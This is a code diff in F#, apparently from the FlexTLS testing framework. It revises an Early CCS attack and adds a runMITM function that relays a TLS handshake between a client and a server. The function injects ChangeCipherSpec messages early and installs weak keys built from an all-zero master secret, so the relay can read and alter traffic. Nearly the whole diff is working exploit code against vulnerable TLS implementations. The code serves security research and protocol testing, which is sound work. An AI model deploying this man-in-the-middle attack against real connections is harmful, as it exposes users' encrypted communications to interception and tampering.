@@ -19,6 +19,7 @@ open FlexCCS
 open FlexFinished
 open FlexState
 open FlexSecrets
+open FlexHandshake
 
 
 
@@ -48,33 +49,92 @@ type Attack_EarlyCCS =
         // Then we compute and install the writing keys
         let epk          = { nsc.keys with ms = (Bytes.createBytes 48 0)} in
         let nsc          = { nsc with keys = epk} in
-        let nsc          = FlexSecrets.fillSecrets(st,Client,nsc) in
-        let st           = FlexState.installWriteKeys st nsc in
+        let nscAtt       = FlexSecrets.fillSecrets(st,Client,nsc) in
+        let st           = FlexState.installWriteKeys st nscAtt in
 
         // If this step go through, the peer is suceptible to the attack
         // It should throw a "Unexpected message" fatal alert because of the early CCS
-
-        // We compute the encrypted payload including the fragment header of the ClientKeyExchange but don't send it
-        let fckep,_,_,_  = FlexClientKeyExchange.prepareRSA(st,nsc,fch) in
-        let _,fckeencpwh = FlexRecord.encrypt(st.write.epoch,fsh.pv,st.write.record,Handshake,fckep) in
-        let _,fckeencp   = Bytes.split fckeencpwh 5 in
-
-
-        // We continue the usual handshake procedure
-        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
         
-        // Here instead of the usual plain ClientKeyExchange payload, we concatenate the encrypted one in the log
-        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload @| fckeencpwh in
+        // We continue the usual handshake procedure
+        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,{nscAtt with keys = FlexConstants.nullKeys},fch) in
+        
+        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload  @| fcke.payload in
         let st,ffC       = FlexFinished.send(st,logRoleNSC=(log,Client,nsc)) in
         let st,_         = FlexCCS.receive(st) in
 
         // Start decrypting
-        let st           = FlexState.installReadKeys st nsc in
+        let st           = FlexState.installReadKeys st nscAtt in
 
         let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
         let st,ffS       = FlexFinished.receive(st,verify_data) in
         ()
 
+    static member runMITM (accept, server_name:string, ?port:int) : unit =
+        let port = defaultArg port FlexConstants.defaultTCPPort in
+
+        // Start being a server
+        printf "Please connect to me, and I will attack you.\n";
+        let sst,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",port=6666) in
+        let sst,nsc,sch = FlexClientHello.receive(sst) in
+
+
+        // Start being a client
+        let cst,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in
+        
+        let cst = FlexHandshake.send(cst,sch.payload) in
+        
+        // Forward server hello
+        let cst,nsc,csh   = FlexServerHello.receive(cst,nsc) in
+        if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name csh.suite)) then
+            failwith "Early CCS attack demo only implemented for RSA key exchange"
+        else
+        let sst = FlexHandshake.send(sst,csh.payload) in
+
+        // Inject CCS to everybody
+        let sst,_ = FlexCCS.send(sst) in
+        let cst,_ = FlexCCS.send(cst) in
+
+        // Compute the weak keys and start encrypting data we send
+        let weakKeys      = { FlexConstants.nullKeys with ms = (Bytes.createBytes 48 0)} in
+        let weakNSC       = { nsc with keys = weakKeys} in
+
+        let weakNSCServer = FlexSecrets.fillSecrets(sst,Server,weakNSC) in
+        let sst = FlexState.installWriteKeys sst weakNSCServer in
+        
+        let weakNSCClient = FlexSecrets.fillSecrets(cst,Client,weakNSC) in
+        let cst = FlexState.installWriteKeys cst weakNSCClient in
+
+        // Forward server certificate
+        let cst,_,_,scert = FlexHandshake.getHSMessage(cst) in
+        let sst = FlexHandshake.send(sst,scert) in
+
+        // Forward server hello done
+        let cst,_,_,shd = FlexHandshake.getHSMessage(cst) in
+        let sst = FlexHandshake.send(sst,shd) in
+
+        // Forward client key exchange
+        let sst,_,_,ckex = FlexHandshake.getHSMessage(sst) in
+        let cst = FlexHandshake.send(cst,ckex) in
+
+        // Get the Client CCS, drop it, but install new weak reading keys
+        let sst,_ = FlexCCS.receive(sst) in
+        let sst = FlexState.installReadKeys sst weakNSCServer in
+
+        // Forward the client finished message
+        let sst,_,_,cfin = FlexHandshake.getHSMessage(sst) in
+        let cst = FlexHandshake.send(cst,cfin) in
+
+        // Forward the server CCS, and install weak reading keys on the client side
+        let cst,_ = FlexCCS.receive(cst) in
+        let cst   = FlexState.installReadKeys cst weakNSCClient in
+        let sst,_ = FlexCCS.send(sst) in
+
+        // ...boring: forward server finished message
+        let cst,_,_,sfin = FlexHandshake.getHSMessage(cst) in
+        let sst = FlexHandshake.send(sst,sfin) in
+
+        // done ;-)
+        ()
     end
 
 
